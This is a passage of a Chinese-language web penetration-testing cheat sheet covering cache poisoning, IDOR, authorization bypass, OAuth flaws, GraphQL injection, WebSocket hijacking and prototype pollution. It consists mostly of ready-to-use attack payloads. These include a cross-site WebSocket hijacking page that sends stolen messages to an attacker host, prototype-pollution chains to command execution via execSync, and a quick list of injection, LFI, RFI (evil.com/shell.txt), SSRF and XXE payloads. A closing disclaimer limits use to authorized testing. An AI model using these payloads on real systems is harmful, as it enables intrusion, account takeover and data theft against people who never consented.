# 观察是否有HTTP→HTTPS的重定向被缓存
```


### 15.3 未Keyed参数投毒

```http
# 缓存键不包含某些参数，但这些参数影响响应

# 正常请求（缓存键: /index.html?lang=en）
GET /index.html?lang=en HTTP/1.1
Host: target.com

# 如果响应中有 <link rel="canonical" href="http://target.com/index.html" />
# 尝试投毒:
GET /index.html?lang=en&utm_source=x'><script>alert(1)</script> HTTP/1.1
Host: target.com

# 如果lang=en是缓存键一部分，但utm_source不是，
# 则投毒后的响应会被当作正常页面缓存
```


## 16. 越权/IDOR

### 16.1 水平越权（同级用户数据）

```bash
# ============ 直接ID遍历 ============
curl http://target.com/user/profile/1
curl http://target.com/user/profile/2
curl http://target.com/user/profile/3

# 用Burp Intruder批量遍历
# Payload: 1-1000
# 分析响应中是否有其他用户信息

# ============ 邮箱/用户名遍历 ============
curl http://target.com/api/user/info?email=user1@test.com
curl http://target.com/api/user/info?email=admin@test.com

# ============ UUID遍历（更难预测但同样存在）============
curl http://target.com/order/detail/a1b2c3d4-e5f6-7890-abcd-ef1234567890
curl http://target.com/order/detail/b2c3d4e5-f6a7-8901-bcde-f12345678901

# ============ 文件下载IDOR ============
curl http://target.com/download?file_id=1001
curl http://target.com/download?file_id=1002

# ============ GraphQL IDOR ============
curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{user(id: 2) {name email phone}}"}'
curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{user(id: 3) {name email phone}}"}'
```


### 16.3 权限绕过技巧

```bash
# ============ Referer/Origin头绕过 ============
# 有些应用只检查Referer
curl -H "Referer: http://target.com/admin/dashboard" http://target.com/api/delete_user/5

# ============ 请求方法切换 ============
# POST有鉴权但GET没有
curl -X POST "http://target.com/api/admin/users" → 403
curl -X GET "http://target.com/api/admin/users" → 200

# ============ Content-Type切换 ============
# JSON请求需要鉴权，但form-data不需要
curl -H "Content-Type: application/json" -d '{"action":"delete"}' → 403
curl -H "Content-Type: application/x-www-form-urlencoded" -d "action=delete" → 200

# ============ 假Token绕过 ============
# 传入任意token可能被接受
curl -H "Authorization: Bearer admin" http://target.com/admin/users
# 或者空token
curl -H "Authorization: Bearer null" http://target.com/admin/users
```


### 17.2 state参数缺失/可预测

```bash
# 如果state参数缺失或不验证
# Step 1: 攻击者自己发起OAuth授权，获取自己的code
# Step 2: 不点完成，阻止浏览器重定向
# Step 3: 获取自己的code: https://app.target.com/callback?code=ATTACKER_CODE

# Step 4: 构造钓鱼链接发给受害者
https://app.target.com/callback?code=ATTACKER_CODE&state=ANYTHING

# Step 5: 受害者点击 → 以攻击者的身份登录
# 之后受害者创建的资源都在攻击者名下

# 防御：state必须与用户Session绑定，且在callback时验证
```


### 17.4 scope权限提升

```bash
# 正常OAuth scope: scope=read
# 攻击：尝试提权
https://oauth.target.com/authorize?...&scope=read+write+admin+delete
https://oauth.target.com/authorize?...&scope=read%20write%20admin

# 一些敏感scope:
# profile, email, phone, address, openid, offline_access
# admin, all, *, full_access, superuser
```


### 18.2 GraphQL注入

```graphql
# ============ SQL注入（如果resolver直接拼接SQL）============
query {
  users(filter: "1' OR 1=1--") {
    id
    username
  }
}

# ============ NoSQL注入（MongoDB）============
query {
  user(username: {"$ne": null}) {
    username
    password
  }
}

# ============ 命令注入（resolver中执行系统命令）============
mutation {
  createFile(filename: "test; whoami") {
    status
  }
}
```


### 18.4 IDOR in GraphQL

```graphql
# 直接修改ID查看他人信息
query {
  user(id: 2) {
    email
    ssn
    creditCard
  }
}

# 查看他人订单
query {
  order(id: "ORDER-1002") {
    user { email }
    items { name price }
    shippingAddress
  }
}
```


## 19. WebSocket攻击

### 19.1 跨站点WebSocket劫持 (CSWSH)

```html
<!-- 攻击者的钓鱼页面 -->
<html>
<body>
<script>
  // 建立到目标WebSocket的连接（携带受害者Cookie）
  var ws = new WebSocket('wss://target.com/ws');
  
  ws.onopen = function() {
    console.log("[+] Connected");
    // 发送恶意消息
    ws.send(JSON.stringify({"action":"delete_account","id":"123"}));
    // 窃取数据
    ws.send(JSON.stringify({"action":"get_private_messages"}));
  };
  
  ws.onmessage = function(event) {
    // 把数据外传
    console.log("[+] Received:", event.data);
    new Image().src = 'http://YOUR_IP:8888/?data=' + encodeURIComponent(event.data);
  };
</script>
</body>
</html>
```


### 19.3 WebSocket认证绕过

```bash
# 测试：用普通HTTP会话的Cookie直接连接WebSocket
# 使用curl测试WebSocket握手：
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Cookie: session=USER_SESSION" \
  http://target.com/ws/

# 如果返回101 Switching Protocols，说明认证可能不足
```


## 20. Prototype Pollution (JavaScript原型链污染)

### 20.1 检测

```javascript
// 经典检测payload
// 如果应用有merge/extend函数且接受用户输入

// POST JSON:
{"__proto__": {"polluted": true}}

// 如果应用执行类似 obj = Object.assign({}, userInput) 或 merge({}, userInput)
// 然后检查：
Object.prototype.polluted  // 如果是true，说明存在原型链污染

// 类似的检测：
{"constructor": {"prototype": {"polluted": true}}}
```


### 20.3 原型链污染→RCE

```javascript
// 污染了原型链后，寻找能触发命令执行的点

// 常见利用链1: child_process.spawn/exec 的选项
{
    "__proto__": {
        "shell": "/bin/bash",          // 强制使用bash
        "env": {
            "NODE_OPTIONS": "--require=/tmp/malicious.js"
        }
    }
}

// 常见利用链2: ejs 模板引擎
{
    "__proto__": {
        "outputFunctionName": "a; return global.process.mainModule.constructor._load('child_process').execSync('id'); //"
    }
}
// 之后被污染的Proto会影响ejs编译模板时的参数

// 常见利用链3: pug 模板引擎
{
    "__proto__": {
        "debug": true,
        "compileDebug": true,
        "self": false,
        "line": "global.process.mainModule.require('child_process').execSync('id')"
    }
}

// 常见利用链4: lodash template (lodash < 4.17.21)
{
    "__proto__": {
        "sourceURL": "\u000areturn process.mainModule.require('child_process').execSync('id')"
    }
}
```


## 快速参考：手工检测清单

```

  SQL注入:        ' OR 1=1--    ' AND sleep(5)--           |
  NoSQL注入:      {"$ne":null}   {"$regex":"^a"}          |
  XSS:            <script>alert(1)</script>               |
  CSRF:           构造自动提交表单                          |
  SSRF:           http://169.254.169.254/                 |
  命令注入:       ; whoami     | id     $(whoami)          |
  LFI:            ?file=../../../../etc/passwd            |
  RFI:            ?file=http://evil.com/shell.txt         |
  文件上传:       .php.jpg   .php%00.jpg   .htaccess      |
  XXE:            <!ENTITY xxe SYSTEM "file:///etc/passwd">|
  SSTI:           {{7*7}}    ${7*7}    <%=7*7%>          |
  反序列化:       ysoserial / PHPGGC                      |
  JWT:            alg:none / 弱密钥爆破                    |
  请求走私:       CL.TE / TE.CL                            |
  缓存投毒:       X-Forwarded-Host                        |
  越权:           /user/1 → /user/2                       |
  OAuth:          redirect_uri劫持                        |
  GraphQL:        query{__schema{types{name}}}            |
  WebSocket:      跨站点WebSocket劫持                      |
  PrototypePollution: {"__proto__":{"isAdmin":true}}     |

```

---

> **免责声明**：本文技术内容仅供安全研究和授权测试参考。对任何系统进行未授权的渗透测试、攻击或利用是违法行为。请在获得明确书面授权后进行安全测试。
